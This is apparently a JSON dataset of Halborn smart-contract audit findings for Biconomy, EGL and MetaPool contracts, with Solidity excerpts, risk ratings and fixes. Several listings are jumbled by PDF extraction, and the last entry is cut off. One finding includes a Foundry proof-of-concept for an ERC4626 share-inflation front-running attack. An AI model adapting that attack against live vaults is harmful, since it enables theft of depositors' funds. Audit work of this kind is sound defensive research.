        "body": "The BasePaymaster contract uses a modifier to control functions are The other onlyOwner modifier uses called by EntryPoint address. However, the _msgSender() function to return msg.sender address. _requireFromEntryPoint modifier uses msg.sender directly. Only one of these pattern should be used to increase readability. Code Location: Listing 13: BasePaymaster.sol (Line 143) 142 function _requireFromEntryPoint () internal virtual { 143 144 require ( msg . sender == address ( entryPoint )) ; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider _msgSender() _requireFromEntryPoint modifier as below. removing the function or change the Listing 14: BasePaymaster.sol - Possible Fix 1 function _requireFromEntryPoint () internal virtual { 2 3 require ( _msgSender () == address ( entryPoint )) ; } 33 Remediation Plan: SOLVED: The Biconomy team solved this finding by replacing the msg.sender to _msgSender() function. Commit ID: f44e1592bbaa90569fd10f4418a4534fa7ff2acd 34 3.10 (HAL-10) IMMUTABLE KEYWORD COSTS LESS GAS FOR CONSTANT VARIABLES - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Biconomy_Smart_Wallet_Contracts_V2",
            "Severity: Informational"
        ]
    },
    {
        "title": "DIVIDE BEFORE MULTIPLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "Solidity integer division might truncate. As a result, performing mul- tiplication before division can sometimes avoid loss of precision. In this audit, there are multiple instances found where division is being performed before multiplication operation in the EglContract.sol. Code Location: EglContract.sol Line #968 Listing 1: EglContract.sol (Lines ) 968 proximityRewardPercent = uint ( actualDelta . mul ( int ( DECIMAL_PRECISION )) . div ( eglDelta )) . mul (75) ; Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider doing multiplication operation before division to prevail pre- cision in the values in non floating data type. Remediation Plan: ACKNOWLEDGED: actualDelta is multiplied by DECIMAL_PRECISION before being divided by eglDelta, then the precision is maintained by EGL Team. 13 ",
        "labels": [
            "Halborn",
            "EGL_EglContract",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF MULTIPLE VOTING CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In the vote progress, the pre-condition checks are not applied on the function. Although _internalVote function prevents to multiple votes, the initial checks should complete at the beginning of the function. Code Location: EglContract.sol Line #968 Listing 2: EglContract.sol (Lines ) 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 497 function vote ( uint _gasTarget , uint _eglAmount , uint8 _lockupDuration ) { external whenNotPaused require ( _eglAmount >= 1 ether , \" EGL : AMNT_TOO_LOW \" ); require ( _eglAmount <= eglToken . balanceOf ( msg . sender ) , \" EGL : INSUFFICIENT_EGL_BALANCE \" ); require ( eglToken . allowance ( msg . sender , address ( this )) >= _eglAmount , \" EGL : INSUFFICIENT_ALLOWANCE \"); if ( block . timestamp > currentEpochStartDate . add ( epochLength )) tallyVotes () ; eglToken . transferFrom ( msg . sender , address ( this ) , _eglAmount ); _internalVote ( msg . sender , _gasTarget , _eglAmount , _lockupDuration , 0 14 498 499 ); } Risk Level: Likelihood - 1 Impact - 3 Recommendation: The initial checks should complete through require() function. The sample solution can be seen below. Listing 3: EglContract.sol (Lines 9) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 function vote ( uint _gasTarget , uint _eglAmount , uint8 _lockupDuration ) external whenNotPaused { require ( voters [ msg . sender ]. tokensLocked == 0 , \" EGL : ALREADY_VOTED \" ); require ( _eglAmount >= 1 ether , \" EGL : AMNT_TOO_LOW \" ); require ( _eglAmount <= eglToken . balanceOf ( msg . sender ) , \" EGL : INSUFFICIENT_EGL_BALANCE \" ); require ( eglToken . allowance ( msg . sender , address ( this )) >= _eglAmount , \" EGL : INSUFFICIENT_ALLOWANCE \"); if ( block . timestamp > currentEpochStartDate . add ( epochLength )) tallyVotes () ; eglToken . transferFrom ( msg . sender , address ( this ) , _eglAmount ); _internalVote ( msg . sender , _gasTarget , _eglAmount , _lockupDuration , 15 22 23 24 } 0 ); Remediation Plan: SOLVED: Validations were completed in the internal function by EGL Team. 16 ",
        "labels": [
            "Halborn",
            "EGL_EglContract",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF ACCESS CONTROL ON THE MANAGEMENT PARAMETERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In the MockEglGenesis contract, canWithdraw and canContribute variable is defined as a public function. These function could be called by anyone. Although, the contract named as MockEglGenesis, the modifier should add at the beginning of the function. Code Location: MockEglGenesis.sol Line #33-39 Listing 4: MockEglGenesis.sol (Lines 33,37) 33 34 35 36 37 38 39 function setCanContribute ( bool _canContribute ) external { canContribute = _canContribute ; } function setCanWithdraw ( bool _canWithdraw ) external { canWithdraw = _canWithdraw ; } Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommend to add onlyOwner modifier at the beginning of the function. Example remediated code can be seen below. 17 Listing 5: RemediatedMockEglGenesis.sol (Lines 33,37) 33 function setCanContribute ( bool _canContribute ) external onlyOwner { } canContribute = _canContribute ; 34 35 36 37 function setCanWithdraw ( bool _canWithdraw ) external onlyOwner { 38 39 canWithdraw = _canWithdraw ; } Remediation Plan: NOT APPLICABLE: The mock-up contracts are added only for testing purpose. 18 ",
        "labels": [
            "Halborn",
            "EGL_EglContract",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In the EGL, The contracts are using block.timestamp. The global variable block.timestamp does not necessarily hold the current time, and may not be accurate. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. There is no guarantee that the value is correct, only that it is higher than the previous blocks timestamp. Code Location: EglContract.sol Line #33-39 Listing 6: EglContract.sol (Lines 392) 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 function claimSupporterEgls ( uint _gasTarget , uint8 _lockupDuration ) external whenNotPaused { require ( remainingSupporterBalance > 0, \" EGL : SUPPORTER_EGLS_DEPLETED \" ); require ( remainingBptBalance > 0, \" EGL : BPT_BALANCE_DEPLETED \" ); require ( eglGenesis . canContribute () == false && eglGenesis . canWithdraw () == false , \" EGL : GENESIS_LOCKED \" ); require ( supporters [ msg . sender ]. claimed == 0 , \" EGL : ALREADY_CLAIMED \" ); ( uint contributionAmount , uint cumulativeBalance , ,) = eglGenesis . contributors ( msg . sender ); require ( contributionAmount > 0, \" EGL : NOT_CONTRIBUTED \"); if ( block . timestamp > currentEpochStartDate . add ( epochLength )) tallyVotes () ; ... 19 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: NOT APPLICABLE: the EGL Team considers safe the usage of block.timestamp because 900 seconds of drift from miners is preferable to other options. Calculating time from the block could be wrong if there is a fork or upgrade - timestamps are less vulnerable to a change in block duration that could occur with Ethereum 2.0 upgrades or hard forks. Use of oracles would create a dependency on the health of a third party service and potentially incur additional fees. 20 ",
        "labels": [
            "Halborn",
            "EGL_EglContract",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING EVENT HANDLER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In the EglContract contract, the some of functions do not emit event after the progress. Events are a method of informing the transaction initiator It logs its emitted about the actions taken by the called function. parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. EglContract.sol Line #~542 Listing 7: EglContract.sol (Lines 542) 542 543 544 545 546 function withdraw () external whenNotPaused { require ( voters [ msg . sender ]. tokensLocked > 0, \" EGL : NOT_VOTED \" ); require ( block . timestamp > voters [ msg . sender ]. releaseDate , \" EGL : NOT_RELEASE_DATE \" ); eglToken . transfer ( msg . sender , _internalWithdraw ( msg . sender )); } EglContract.sol Line #~640 Listing 8: EglContract.sol (Lines ) 640 641 642 643 644 645 646 647 648 649 function pauseEgl () external onlyOwner whenNotPaused { _pause () ; } /* * * @notice Owner only function to unpause contract */ function unpauseEgl () external onlyOwner whenPaused { _unpause () ; } 21 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider as much as possible declaring events at the end of function. Events can be used to detect the end of the operation. Remediation Plan: SOLVED: The Withdraw event is now emitted from the internal withdraw function, as well as Pause and Unpause events are emitted from the parent functions. 22 ",
        "labels": [
            "Halborn",
            "EGL_EglContract",
            "Severity: Low"
        ]
    },
    {
        "title": "IGNORED RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The return value of an external call is not stored in a local or state variable. In the EglContract.sol contract, there are a few instances where the multiple methods are called and the return value (bool) is ignored. Code Location: EglContract.sol Line #~491,522,545,560,631,915 Listing 9: EglContract.sol (Lines 491) eglToken . transferFrom ( msg . sender , address ( this ) , _eglAmount ); 491 492 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Add a return value check to avoid an unexpected crash of the contract. As an other Return value checks provide better exception handling. solution, Use SafeERC20 on the both networks when possible and ensure that the transfer/transferFrom return value is checked. A custom function named safeTransferFrom can be implemented that checks the return value of the transferFrom function and makes sure that the funds were transferred. 23 Remediation Plan: SOLVED: The return values are now checked on the transferFrom function. Listing 10: EglContract.sol (Lines ) 491 492 bool success = eglToken . transferFrom ( msg . sender , address ( this ) , _eglAmount ); require ( success , \" EGL : TOKEN_TRANSFER_FAILED \"); 24 ",
        "labels": [
            "Halborn",
            "EGL_EglContract",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF ASSERT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In the solidity, assert() and require() functions are used for protecting contract on the unexceptional behaviours. With the assert() function, it is not possible to evaluate return value. Code Location: EglContract.sol Line #802 Listing 11: EglContract.sol (Lines 802) 795 796 797 798 799 800 801 802 803 804 function _internalVote ( address _voter , uint _gasTarget , uint _eglAmount , uint8 _lockupDuration , uint _releaseTime ) internal { assert ( _voter != address (0) ) ; ... } EglContract.sol Line #1049 Listing 12: EglContract.sol (Lines 1049) 1039 1040 1041 1042 1043 1044 1045 1046 1047 function _calculateCurrentPoolTokensDue ( uint _currentEgl , uint _firstEgl , uint _lastEgl , uint _totalPoolTokens ) internal pure returns ( uint poolTokensDue ) 25 1048 1049 1050 1051 1052 1053 1054 1055 1056 1057 1058 1059 1060 { } assert ( _firstEgl < _lastEgl ); if ( _currentEgl < _firstEgl ) return 0; uint eglsReleased = ( _currentEgl . umin ( _lastEgl )) . sub ( _firstEgl ); poolTokensDue = _totalPoolTokens . mul ( eglsReleased ) . div ( _lastEgl . sub ( _firstEgl ) ); EglContract.sol Line #1077 Listing 13: EglContract.sol (Lines 1077) 1069 1070 1071 1072 1073 1074 1075 1076 1077 1078 1079 1080 1081 1082 1083 1084 1085 function _calculateBonusEglsDue ( uint _firstEgl , uint _lastEgl ) { } internal pure returns ( uint bonusEglsDue ) assert ( _firstEgl < _lastEgl ); bonusEglsDue = ( _lastEgl . div ( DECIMAL_PRECISION ) **4) . sub ( _firstEgl . div ( DECIMAL_PRECISION ) **4) . mul ( DECIMAL_PRECISION ) . div ( (81/128) *(10**27) ); EglContract.sol Line #1107 26 Listing 14: EglContract.sol (Lines 1107) 1097 1098 1099 1100 1101 1102 1103 1104 1105 1106 1107 1108 1109 function _calculateVoterReward ( address _voter , uint16 _currentEpoch , uint16 _voterEpoch , uint8 _lockupDuration , uint _voteWeight internal returns ( uint rewardsDue ) assert ( _voter != address (0) ) ; ... ) { } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use require() function instead of assert() function. This change will improve code readability. The example code snippet can be seen below. Listing 15: EglContract.sol (Lines 802) 795 796 797 798 799 800 801 802 803 804 function _internalVote ( address _voter , uint _gasTarget , uint _eglAmount , uint8 _lockupDuration , uint _releaseTime ) internal { require ( _voter != address (0) ,\" EGL : VOTER_COULD_NOT_BE_ZERO_ADDRESS \" ); ... } 27 Remediation Plan: SOLVED: The assert() function is replaced by require() function on the related statements. Listing 16: EglContract.sol (Lines 802) 1114 1115 1116 1117 1118 1119 1120 1121 1122 1123 1124 function _calculateVoterReward ( address _voter , uint16 _currentEpoch , uint16 _voterEpoch , uint8 _lockupDuration , uint _voteWeight internal returns ( uint rewardsDue ) ) { require ( _voter != address (0) , \" EGL : VOTER_ADDRESS_0 \" ); 28 ",
        "labels": [
            "Halborn",
            "EGL_EglContract",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the vote and re-vote functions with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against Reentrancy attacks. Code Location: Listing 17: EglContract.sol (Lines 491) 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 function vote ( uint _gasTarget , uint _eglAmount , uint8 _lockupDuration ) { external whenNotPaused require ( _eglAmount >= 1 ether , \" EGL : AMNT_TOO_LOW \" ); require ( _eglAmount <= eglToken . balanceOf ( msg . sender ) , \" EGL : INSUFFICIENT_EGL_BALANCE \" ); require ( eglToken . allowance ( msg . sender , address ( this )) >= _eglAmount , \" EGL : INSUFFICIENT_ALLOWANCE \"); if ( block . timestamp > currentEpochStartDate . add ( epochLength )) tallyVotes () ; eglToken . transferFrom ( msg . sender , address ( this ) , _eglAmount ); _internalVote ( msg . sender , _gasTarget , _eglAmount , _lockupDuration , 29 497 498 499 } 0 ); Listing 18: EglContract.sol (Lines 522) 509 510 511 512 513 514 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 533 534 535 536 537 function reVote ( uint _gasTarget , uint _eglAmount , uint8 _lockupDuration ) { } external whenNotPaused require ( voters [ msg . sender ]. tokensLocked > 0, \" EGL : NOT_VOTED \" ); if ( _eglAmount > 0) { require ( _eglAmount >= 1 ether , \" EGL : AMNT_TOO_LOW \"); require ( _eglAmount <= eglToken . balanceOf ( msg . sender ) , \" EGL : INSUFFICIENT_EGL_BALANCE \"); require ( eglToken . allowance ( msg . sender , address ( this )) >= _eglAmount , \" EGL : INSUFFICIENT_ALLOWANCE \" ); eglToken . transferFrom ( msg . sender , address ( this ) , _eglAmount ); } if ( block . timestamp > currentEpochStartDate . add ( epochLength )) tallyVotes () ; uint originalReleaseDate = voters [ msg . sender ]. releaseDate ; _eglAmount = _eglAmount . add ( _internalWithdraw ( msg . sender )) ; _internalVote ( msg . sender , _gasTarget , _eglAmount , _lockupDuration , originalReleaseDate ); emit ReVote ( msg . sender , _gasTarget , _eglAmount , now ); 30 Recommendation: In the EglContract.sol contract, the vote() and reVote() functions are missing nonReentrant guard. Use the nonReentrant modifier to avoid in- troducing future vulnerabilities. Remediation Plan: SOLVED: The re-entrancy protection was added into the function. Listing 19: EglContract.sol (Lines 522) 509 function reVote ( uint _gasTarget , uint _eglAmount , uint8 _lockupDuration ) external whenNotPaused nonReentrant 510 function vote ( uint _gasTarget , uint _eglAmount , uint8 _lockupDuration ) external whenNotPaused nonReentrant 31 ",
        "labels": [
            "Halborn",
            "EGL_EglContract",
            "Severity: Informational"
        ]
    },
    {
        "title": "BLOCK TIMESTAMP ALIAS USAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_EglContract_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "During a manual static review, the Halborn Team noticed the use of now. The global variable now is deprecated after the pragma version v0.7.0. Solidity Pragma Version 0.7.0 - Now Deprecated Code Location: Listing 20: EglContract.sol (Lines 763) 758 759 760 761 762 763 764 765 766 767 768 769 770 771 772 773 774 775 776 function addSeedAccount ( address _seedAccount , uint _seedAmount ) public onlyOwner { require ( _seedAmount <= remainingSeederBalance , \" EGL : INSUFFICIENT_SEED_BALANCE \" ); require ( seeders [ _seedAccount ] == 0, \" EGL : ALREADY_SEEDER \"); require ( voters [ _seedAccount ]. tokensLocked == 0 , \" EGL : ALREADY_HAS_VOTE \"); require ( eglToken . balanceOf ( _seedAccount ) == 0, \" EGL : ALREADY_HAS_EGLS \"); require ( now < firstEpochStartDate . add ( minLiquidityTokensLockup ) , \" EGL : SEED_PERIOD_PASSED \"); ( uint contributorAmount , , ,) = eglGenesis . contributors ( _seedAccount ); require ( contributorAmount == 0 , \" EGL : IS_CONTRIBUTOR \" ); remainingSeederBalance = remainingSeederBalance . sub ( _seedAmount ); remainingDaoBalance = remainingDaoBalance . sub ( _seedAmount ) ; seeders [ _seedAccount ] = _seedAmount ; emit SeedAccountAdded ( _seedAccount , _seedAmount , remainingSeederBalance , now ); } 32 Recommendation: Use block.number instead of block.timestamp or now reduce the influence of miners. If it is not possible to use block.number, now should replace with block.timestamp. Remediation Plan: NOT APPLICABLE: now was replaced by block.timestamp function. EGL Team considers safe the usage of block.timestamp because 900 seconds of drift from miners is preferable to other options. Calculating time from the block could be wrong if there is a fork or upgrade - timestamps are less vulnerable to a change in block duration that could occur with Ethereum 2.0 upgrades or hard forks. the use of oracles would create a dependency on the health of a third party service and potentially incur additional fees. 33 ",
        "labels": [
            "Halborn",
            "EGL_EglContract",
            "Severity: Informational"
        ]
    },
    {
        "title": "VAULT IMPLEMENTATION IS VULNERABLE TO INFLATION ATTACK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The StakedAuroraVault contract follows the EIP4626 standard: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/ contracts/token/ERC20/extensions/ERC4626.sol This extension allows the minting and burning of shares (represented using the ERC20 inheritance) in exchange for underlying assets through standardized deposit, mint, redeem and burn workflows. But this extension also has the following problem: When the vault is empty or nearly empty, deposits are at high risk of being stolen through front-running by inflating the share-token value through burning obtained shares. This is variously known as a donation or inflation attack and is essentially a problem of slippage. Therefore, this issue could affect the users using the protocol that run the risk of losing a part of their deposited tokens. Code Location: staking-pool-aurora: Listing 1: contracts/StakedAuroraVault.sol (Line 241) 240 function burn ( uint256 amount ) external { 241 242 } _burn ( msg . sender , amount ); 20 Listing 2: contracts/StakedAuroraVault.sol (Line 249) 247 function burnFrom ( address account , uint256 amount ) external { 248 249 250 } _spendAllowance ( account , msg . sender , amount ); _burn ( account , amount ); BVSS: AO:A/AC:L/AX:L/C:M/I:N/A:N/D:H/Y:N/R:N/S:U (8.8) Proof of Concept: In order to exploit the issue, an attacker just has to follow the next steps: 1. An attacker detects that a user is going to deposit and amount of tokens and front-runs the transaction by depositing an amount of tokens to burn its shares associated until keeping one, which will Burning these correspond to the entire balance of the contract. shares will inflate the value of share-token in the vault. For example, Alice wants to deposit 200 ETH, then the attacker front- run this transaction by depositing 100 ETH + 1 WEI to burn just after 100 shares. The attacker will end up having 1 share and the vault 100 ETH + 1 WEI. 2. Once the value of the share-token has been inflated, the victims transaction gets included in a block receiving many fewer shares due to the inflation. Following with the example, Alice finally deposits 200 ETH receiving only 1 share. 3. The attacker redeems the share, receiving part of the amount de- posited in the victims transaction that was front-run previously. In the example, the attacker will end up withdrawing 150 ETH, ob- taining 50 ETH of profit from previous Alices deposit and 100 ETH from the attackers deposit. The test described below and developed in Foundry shows balances and which 21 action has been performed in each step, proving a successful exploitation of this issue following the aforementioned steps: Listing 3: Inflation attack POC vm . prank ( OPERATOR ); stakedAuroraVault . updateEnforceWhitelist ( false ); aur . approve ( address ( stakedAuroraVault ) , 100 ether + 1) ; stakedAuroraVault . deposit (100 ether + 1, ATTACKER ); console . log ( \" [*] After ATTACKER 's deposit :\" ); printBalances () ; stakedAuroraVault . burn (100 ether ); // Inflate shares ' console . log ( \" [*] After ATTACKER 's inflation :\" ); printBalances () ; console . log (\" [ -] Initial balances :\" ); printBalances () ; prepareBalances () ; vm . startPrank ( ATTACKER ); { 1 function testInflationAttack () public { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  value 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  pending 38 vm . startPrank ( ATTACKER ); { vm . startPrank ( ALICE ); { } vm . stopPrank () ; } vm . stopPrank () ; console . log (\" [+] Victim deposit tokens : \"); printBalances () ; stakedAuroraVault . redeem (1 , ATTACKER , ATTACKER ); stakingManager . cleanOrdersQueue () ; // Set tokens as aur . approve ( address ( stakedAuroraVault ) , 200 ether ); stakedAuroraVault . deposit (200 ether , ALICE ); 22 stakingManager . cleanOrdersQueue () ; // Withdraw pending stakingManager . getAvailableAssets ( ATTACKER ) , ATTACKER , ATTACKER console . log (\" [*] After ATTACKER 's withdraw :\" ); printBalances () ; // AURORA 's tau ); skip (2 hours ); stakedAuroraVault . withdraw ( } vm . stopPrank () ; 39 40 41  tokens 42 43 44 45 46 47 48 49 50 51 52 } 53 54 function prepareBalances () public { 55 56 57 58 59 60 } 61 62 function printBalances () public view { 63  ATTACKER )); 64  balanceOf ( ATTACKER )); 65  totalSupply () ); 66 67  balanceOf ( ALICE )); 68 69 } aur . mint ( ALICE , 200 ether ); aur . mint ( BOB , 200 ether ); aur . mint ( CHARLIE , 200 ether ); aur . mint ( ATTACKER , 200 ether ); console . log (\" \" ); console . log (\" \\t - Attacker AUR balance : \" , aur . balanceOf ( console . log (\" \\t - Attacker stAUR balance : \" , stakedAuroraVault . console . log (\" \\t - stAUR total supply : \" , stakedAuroraVault . console . log (\" \\t - Alice AUR balance : \" , aur . balanceOf ( ALICE )) ; console . log (\" \\t - Alice stAUR balance : \" , stakedAuroraVault . 23 Files required to execute properly this test such as DeploymentHelper.sol have been included in the Appendix of this document. 24 Recommendation: It is recommended to not allow users to burn shares arbitrarily in order to avoid inflating them, this could be done by removing public burn functions or controlling their access. Also, vault deployers can protect against this attack by making an initial deposit of a non-trivial amount of the asset, such that price manipulation becomes infeasible. Remediation Plan: SOLVED: The MetaPool team solved the issue by removing public burn func- tions in the following commit ID:  e8dd85072bf7cd8a1c38a2d49068b42beee85d82. 25 ",
        "labels": [
            "Halborn",
            "MetaPool_Staking_Pools_Aurora",
            "Severity: High"
        ]
    },
    {
        "title": "ERC4626 VAULT DEPOSITS AND WITHDRAWS SHOULD CONSIDER SLIPPAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The scoped repositories make use of ERC4626 custom implementations that should follow the EIP-4626 definitions. This standard states the follow- ing security consideration: \"If implementors intend to support EOA account access directly, they should consider adding another function call for deposit/mint/withdraw /redeem with the means to accommodate slippage loss or unexpected deposit/withdrawal limits, since they have no other means to revert the transaction if the exact output amount is not achieved.\" These vault implementations do not implement a way to limit the slippage when deposits/withdraws are performed. This condition affects specially to EOA since they dont have a way to verify the amount of tokens received and revert the transaction in case they are too few compared to what was expected to be received. Applying this security consideration would help to EOA to avoid being front-run and losing tokens in transactions towards these smart contracts. Code Location: Listing 4: contracts/LiquidityPool.sol 166 function deposit ( 167 168 169 ) public override onlyFullyOperational returns ( uint256 ) uint256 _assets , address _receiver 26 Listing 5: contracts/LiquidityPool.sol 182 function redeem ( 183 184 185 186 ) public override onlyFullyOperational returns ( uint256 ) uint256 _shares , address _receiver , address _owner Listing 6: contracts/StakedAuroraVault.sol 178 function deposit ( 179 180 181 ) public override onlyFullyOperational checkWhitelist returns ( uint256 _assets , address _receiver  uint256 ) Listing 7: contracts/StakedAuroraVault.sol 190 function mint ( 191 192 193 ) public override onlyFullyOperational checkWhitelist returns ( uint256 _shares , address _receiver  uint256 ) Listing 8: contracts/StakedAuroraVault.sol 204 function withdraw ( 205 206 207 208 ) public override returns ( uint256 ) uint256 _assets , address _receiver , address Listing 9: contracts/StakedAuroraVault.sol 217 function redeem ( 218 219 220 221 ) public override onlyFullyOperational returns ( uint256 ) uint256 _shares , address _receiver , address _owner 27 BVSS: AO:A/AC:L/AX:M/C:N/I:N/A:N/D:M/Y:N/R:N/S:U (3.4) Recommendation: It is recommended to include slippage checks in the aforementioned func- tions to allow EOA to set the minimum amount of tokens that they expect to receive by executing these functions. References:  EIP-4626: Security Considerations Remediation Plan: SOLVED: The MetaPool team solved the issue by deploying new routers in order to handle EOA transactions and their respective slippage in the following commit ID:  9f2098d652f583b42eaa09cf5bd268bc4af46579. 28 ",
        "labels": [
            "Halborn",
            "MetaPool_Staking_Pools_Aurora",
            "Severity: Low"
        ]
    },
    {
        "title": "SAME DEPOSITOR CAN BE ADDED MULTIPLE TIMES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The StakingManager smart contract allows inserting multiple depositors that will be used to split the staking load into several smart contracts that should implement the IDepositors interface. The insertion process is made through the execution of insertDepositor function, where the depositors address will be stored in an array of depositors by executing the arrays native push function. However, since an array is being used instead of a mapping, a depositors address could be added to the array several times due this condition is not being checked before inserting a new depositor. This could cause a malfunction of the protocols logic. Code Location: Listing 10: contracts/StakingManager.sol 117 function insertDepositor ( 118 119 ) external onlyRole ( ADMIN_ROLE ) { 120 address _depositor require ( getDepositorsLength () < maxDepositors , \"  DEPOSITORS_LIMIT_REACHED \" ); depositors . push ( _depositor ); nextDepositor = _depositor ; _updateDepositorShares ( _depositor ); emit NewDepositorAdded ( _depositor , msg . sender ); 121 122 123 124 125 126 } BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:L/D:N/Y:N/R:P/S:U (2.8) 29 Recommendation: It is recommended to verify whether a depositors address has been stored previously in order to avoid major issues. Remediation Plan: SOLVED: The MetaPool team solved the issue by checking if the depositor already exists in the following commit ID:  5a2e083c72df10905d487fd235062435eba9702e. 30 ",
        "labels": [
            "Halborn",
            "MetaPool_Staking_Pools_Aurora",
            "Severity: Low"
        ]
    },
    {
        "title": "AN EXCESS OF DEPOSITORS COULD LEAD TO DOS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The StakingManager smart contract allows setting multiple depositors that will handle the interaction with Aurora external protocol to stake, enabling the possibility to have multiple instances where tokens will be staked during all this process. Depositors are controlled by using a dynamic array which stores a number of addresses limited by maxDepositors variable, and an operator can set depositors arbitrarily in this mapping as long as the length of depositors does not exceed maxDepositors value. However, many functions iterate over the aforementioned dynamic array in order to perform a search on it, thus in case of this mapping is large enough, a transaction could run out of gas by calling one of these functions. Code Location: Listing 11: contracts/StakingManager.sol (Line 222) 220 function depositorExists ( address _depositor ) external view returns  ( bool ) { 221 222 223 224 225 226 227 228 } uint256 _totalDepositors = getDepositorsLength () ; for ( uint i = 0; i < _totalDepositors ; i ++) { if ( depositors [ i] == _depositor ) { return true ; } } return false ; 31 Listing 12: contracts/StakingManager.sol (Line 240) 236 function setNextDepositor () external onlyStAurVault { 237 238 239 240 241 _updateDepositorShares ( nextDepositor ); address _nextDepositor = depositors [0]; uint256 _totalDepositors = getDepositorsLength () ; for ( uint i = 0; i < _totalDepositors ; i ++) { // Keeping a < instead of <= allows prioritizing the  deposits in lower index depositors . 242 if ( depositorShares [ depositors [ i ]] < depositorShares [  _nextDepositor ] ) { _nextDepositor = depositors [ i ]; } } nextDepositor = _nextDepositor ; 243 244 245 246 247 } BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:L/D:L/Y:L/R:P/S:U (2.2) Recommendation: It is recommended to be very restrictive regarding the limits of depositors array length and also, implementing a function to remove depositors from the array. Remediation Plan: SOLVED: The MetaPool team solved the issue by restricting the aforemen- tioned array length to 20. 32 ",
        "labels": [
            "Halborn",
            "MetaPool_Staking_Pools_Aurora",
            "Severity: Low"
        ]
    },
    {
        "title": "USAGE OF SEVERAL LOOPS IN UNSTAKING PROCESS COULD LEAD TO DOS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The cleanOrdersQueue function implemented in StakingManager smart con- tract allows processing all requested withdraws which have been put in queue between executions of this function. All these withdraw re- quests run through different states until withdraws are made effec- For instance, when an account wants to withdraw their staked tive. tokens a WithdrawOrder is created, after cleanOrdersQueue execution all WithdrawOrders are put into PendingOrders mapping and the protocol re- quests the withdrawal of these associated staked tokens to Aurora proto- col, in the next cleanOrdersQueue execution the order will be moved from PendingOrders into AvailableAssets mapping. At this point, the tokens could be withdrawn from the protocol. This function is executed every a constant defined by Aurora protocol plus a constant defined in StakingManager contract. Moreover, its operation is crucial for the correct functioning of the protocol. However, this function makes use of a huge amount of gas, since processing every state of each withdraw request requires to iterates over each request and each state independently by using several loops. Therefore, there is a possibility of running out of gas if there is a high volume of requests to process. Code Location: Listing 13: contracts/StakingManager.sol 351 for ( uint i = 0; i < 